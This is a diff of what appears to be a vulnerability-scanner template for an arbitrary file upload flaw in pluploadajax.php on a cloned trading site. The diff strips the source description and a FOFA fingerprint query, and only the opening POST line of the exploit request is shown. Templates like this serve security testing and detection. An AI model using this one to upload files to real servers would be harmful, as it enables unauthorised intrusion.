@@ -3,12 +3,8 @@ info:
   name: 仿转转交易猫⼗六合⼀⾃带客服系统pluploadajax存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ox534yl9zuzd9b19'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ox534yl9zuzd9b19
-    fofa: 'header="Location: [http://www.baidu.com"](http://www.baidu.com%22) && header="Cache-Control: no-store, no'
 http:
 - raw:
   - 'POST /wuyun/pluploadajax.php HTTP/1.1
